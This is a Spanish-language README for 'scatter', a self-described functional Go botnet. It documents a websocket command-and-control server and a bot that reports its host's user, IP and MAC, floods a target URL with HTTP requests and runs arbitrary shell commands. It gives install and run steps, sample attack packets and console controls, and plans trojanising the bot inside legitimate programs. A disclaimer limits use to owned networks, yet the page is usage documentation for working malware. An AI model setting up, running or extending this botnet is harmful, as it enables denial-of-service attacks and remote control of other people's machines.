# scatter

*del inglés: dispersar, dispersión o esparcir.*

prueba de concepto de botnet hecha en go. la hice para aprender y porque me aburría.

> **aviso:** esta es una prueba de concepto funcional pero NO ES SERIA. no lo uses contra redes, personas o servicios que no sean tuyos (o donde no tengas permiso explícito por escrito). si no sabes si puedes probarlo, no seas tontico y  no lo pruebes.



## ¿qué es una botnet?

**malware** que monta una **red de ordenadores zombie** controlados desde fuera.

suele usarse para cosas como:

- ataques ddos
- minado de criptos
- phishing

### partes típicas

| rol | qué hace |
|-----|----------|
| **pastores (c2)** | servidores de comando y control. mandan órdenes y coordinan ataques. |
| **bots (clientes)** | máquinas infectadas que obedecen al c2. en conjunto forman la botnet. |

## ¿qué es scatter?

una botnet **mínima** con dos piezas:

1. **centralita** (`centralita.go`) — el c2.
2. **cliente** (`cliente.go`) — el bot que se conecta y ejecuta órdenes.

comunicación por **websockets** en el puerto `42069`, mandando **json** con `action` y, si toca, `payload`.

## ¿cómo funciona?

```
  [ centralita :42069 ]
         │
         │  websocket /ws
         │
    ┌────┴────┬─────────┐
    │         │         │
 [cliente] [cliente] [cliente]
```

1. el cliente abre `ws://<ip_c2>:42069/ws` y envía quién es (usuario, ip local, mac).
2. la centralita lo registra y desde consola puedes mandar órdenes a todos (broadcast).
3. el cliente reacciona según la `action` recibida.

### órdenes soportadas

| `action` | efecto |
|----------|--------|
| `START` | lanza peticiones http concurrentes contra la url del `payload` (stress / ddos de laboratorio). |
| `STOP` | para el ataque en curso. |
| `SHELL` | ejecuta un comando en shell (`sh -c`) y devuelve salida (pensado para reverse shell a medias). |

### ejemplos de paquetes

parar todo:

```json
{ "action": "STOP" }
```

atacar una url (cada cliente usa su propia concurrencia interna):

```json
{ "action": "START", "payload": "http://192.168.1.10/" }
```

## requisitos

- go **1.20+**
- red donde centralita y clientes se vean

## instalación

```bash
git clone <url-de-este-repo>
cd scatter
go mod download
```

en `cliente.go` cambia la patraña de la ip del c2:

```go
CENTRALITA_IP = "ws://TU_IP:42069/ws"
```

## uso

### 1. arrancar la centralita

```bash
go run centralita.go
```

verás algo como `scatter :42069`. la consola acepta:

| tecla | acción |
|-------|--------|
| `s` | broadcast `START` (te pide el `payload`, normalmente una url). |
| `x` | broadcast `STOP`. |
| `l` | lista tonticos conectaos y prepara selección para shell (wip). |
| `q` | guarda lista de clientes en json y sale. |

### 2. arrancar clientes

en cada máquina del lab:

```bash
go run cliente.go
```

si la centralita no está arriba, reintenta cada 10 segundos.

## built with

- [go](https://go.dev/)
- [gorilla/websocket](https://github.com/gorilla/websocket)

## posibles mejoras

cosas que apunté y aún no están (y no estarán jaja salu2):

- insertar el cliente en programas legítimos (en plan troyano style)
- reescribir cliente/centralita en otro lenguaje (el protocolo es simple json por ws)
- cifrado de paquetes
- reverse shell de verdad (ahora `SHELL` ejecuta y responde, pero la centralita no lo usa del todo en `l`)

## autor

- **yo** - *me aburría*

## licencia

tu ere loko?

---

*sa acabao*
